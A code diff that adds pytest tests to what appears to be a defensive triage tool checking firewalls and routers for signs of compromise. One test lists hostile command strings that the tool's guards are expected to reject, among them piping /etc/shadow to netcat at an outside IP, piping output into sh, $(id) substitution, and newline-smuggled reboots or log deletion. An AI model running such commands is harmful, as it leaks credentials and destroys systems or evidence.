@@ -368,7 +368,8 @@ def test_shipped_commands_still_pass():
             if s.impact == "none":
                 for c in (s.cmd, s.list_cmd):
                     if c:
-                        prof.check_command(c.format(**{v: "/data/lang/custom" for v in s.requires_vars}))
+                        prof.check_command(c.format(**{v: s.var_examples.get(v, "/data/lang/custom")
+                                                       for v in s.requires_vars}))
 
 
 def test_forged_listing_lines_are_not_fetched(fx, tmp_path):
@@ -456,3 +457,113 @@ def test_every_implant_without_coverage_states_a_gap():
     for p in (ROOT / "artifacts/intel/implants").glob("*.yml"):
         doc = yaml.safe_load(p.read_text())
         assert doc.get("detections") or doc.get("gap"), p.name
+
+
+# ------------------------------------------------------------------ new platforms (2026-10-22)
+NEW_PLATFORMS = [("junos", "junos", {}), ("cisco-iosxe", "iosxe", {"boot_image": "bootflash:packages.conf"}),
+                 ("f5-bigip", "f5", {}), ("checkpoint-gaia", "checkpoint", {})]
+
+
+@pytest.mark.parametrize("profile,fixture,var", NEW_PLATFORMS)
+def test_new_platform_benign_is_not_called_clean(fx, tmp_path, profile, fixture, var):
+    root = run(fx, tmp_path, profile, f"{fixture}-benign", variables=var)
+    f = analyze(root)
+    assert f["verdict"]["level"] == "NO-INDICATORS-FOUND"
+    assert not [r for r in f["detections"] if r["status"] == "hit"]
+
+
+@pytest.mark.parametrize("profile,fixture,var,expected", [
+    ("junos", "junos", {}, "COMPROMISED"),
+    ("cisco-iosxe", "iosxe", {"boot_image": "bootflash:packages.conf"}, "COMPROMISED"),
+    ("f5-bigip", "f5", {}, "COMPROMISED"),
+    ("checkpoint-gaia", "checkpoint", {}, "LIKELY-COMPROMISED"),
+])
+def test_new_platform_compromised_verdict(fx, tmp_path, profile, fixture, var, expected):
+    root = run(fx, tmp_path, profile, f"{fixture}-compromised", variables=var)
+    assert analyze(root)["verdict"]["level"] == expected
+
+
+def test_junos_masquerade_matches_exact_names_only(fx, tmp_path):
+    f = analyze(run(fx, tmp_path, "junos", "junos-compromised"))
+    names = {h["excerpt"].split()[-1] for h in det(f, "junos-unc3886-masquerade-proc")["hits"]}
+    assert names == {"appid", "to"}            # appidd and jddosd in the same listing must not match
+    assert det(f, "junos-login-record-backups")["hit_count"] == 2
+    assert det(f, "junos-unc3886-tinyshell-yara")["status"] == "not-evaluated"   # no binaries via CLI
+
+
+def test_iosxe_rwx_dirty_threshold_and_not_evaluated(fx, tmp_path):
+    f = analyze(run(fx, tmp_path, "cisco-iosxe", "iosxe-compromised", variables={"boot_image": "bootflash:packages.conf"}))
+    r = det(f, "iosxe-iosd-rwx-dirty")
+    assert r["hit_count"] == 1 and "12 kB" in r["hits"][0]["detail"]   # rw-p with dirty pages is normal, not a hit
+    # An error instead of smaps must be 'not evaluated', never 'no hit'.
+    import shutil
+    from edgetriage.util import slugify
+    rp = tmp_path / "err"
+    shutil.copytree(fx / "iosxe-benign", rp)
+    (rp / "commands" / (slugify("show platform software process memory rp active name iosd smaps") + ".txt")).write_text(
+        "% Invalid input detected at '^' marker.\n")
+    case = Case(tmp_path / "IR-ERR")
+    collect(get_profile("cisco-iosxe"), ReplayTransport(rp), case, case_id="IR-ERR", operator="t",
+            target={"host": "192.0.2.10"}, preflight={}, variables={"boot_image": "bootflash:packages.conf"})
+    assert det(analyze(case.root), "iosxe-iosd-rwx-dirty")["status"] == "not-evaluated"
+
+
+def test_asa_error_output_is_not_evaluated(fx, tmp_path):
+    import shutil
+    from edgetriage.util import slugify
+    rp = tmp_path / "asaerr"
+    shutil.copytree(fx / "asa-benign", rp)
+    for c in ("show memory region | include lina", "show memory region"):
+        (rp / "commands" / (slugify(c) + ".txt")).write_text("ERROR: % Invalid input detected at '^' marker.\n")
+    case = Case(tmp_path / "IR-ASAERR")
+    collect(get_profile("cisco-asa"), ReplayTransport(rp), case, case_id="IR-ASAERR", operator="t",
+            target={"host": "192.0.2.10"}, preflight={}, variables={})
+    assert det(analyze(case.root), "asa-lina-multiple-exec-regions")["status"] == "not-evaluated"
+
+
+def test_iosxe_implant_check_response_confirms(fx, tmp_path):
+    root = run(fx, tmp_path, "cisco-iosxe", "iosxe-benign", variables={"boot_image": "bootflash:packages.conf"})
+    case = Case(root)
+    m = case.load()
+    m["ingested"].append(case.ingest(fx / "iosxe-implant-check.txt", "implant-check"))
+    case.save(m)
+    f = analyze(root)
+    assert det(f, "iosxe-implant-check-positive")["hits"][0]["tier"] == "confirmed"
+    assert f["verdict"]["level"] == "COMPROMISED"
+
+
+def test_f5_userinfo_burst_uses_vendor_threshold(fx, tmp_path):
+    f = analyze(run(fx, tmp_path, "f5-bigip", "f5-compromised"))
+    r = det(f, "f5-94127-userinfo-burst")
+    assert r["hit_count"] == 1 and r["hits"][0]["extra"]["ip"] == "203.0.113.77"   # 3 from another IP stay below 10
+    benign = analyze(run(fx, tmp_path, "f5-bigip", "f5-benign", case_id="IR-F5B"))
+    assert det(benign, "f5-94127-userinfo-burst")["status"] == "no-hit"
+
+
+def test_checkpoint_cert_subject_export_corroborates(fx, tmp_path):
+    root = run(fx, tmp_path, "checkpoint-gaia", "checkpoint-compromised")
+    case = Case(root)
+    m = case.load()
+    m["ingested"].append(case.ingest(fx / "cp-85102-export.csv", "cp-85102"))
+    case.save(m)
+    f = analyze(root)
+    assert det(f, "cp-85102-attacker-cert-subject")["status"] == "hit"
+    assert f["verdict"]["level"] == "COMPROMISED"     # likely auth-logs + likely web-logs corroborate
+
+
+def test_new_bash_guards_refuse_smuggling():
+    smuggled = {
+        "f5-bigip": ["tmsh list apm session delete all | cat", "tmsh show sys version | cat\nreboot",
+                     "ls -la /tmp | sh", "cat /etc/shadow | nc 192.0.2.9 9", "ls -la ${IFS}",
+                     "find /usr -type f -name 'x' -delete", "tmsh run util bash | cat"],
+        "checkpoint-gaia": ["fw ver; reboot", "ls -l /tmp | sh", "ls -1d $(id)", "clish -c 'set user x'"],
+        "junos": ["show version | no-more | save /var/tmp/x", "request system malware-scan quick-scan",
+                  "show version\nrequest system reboot", "file delete /var/log/messages"],
+        "cisco-iosxe": ["show running-config | redirect bootflash:x", "show clock\nreload",
+                        "verify /sha512 bootflash:x; reload", "guestshell run bash"],
+    }
+    for prof, cmds in smuggled.items():
+        p = get_profile(prof)
+        for c in cmds:
+            with pytest.raises(ProfileError):
+                p.check_command(c)
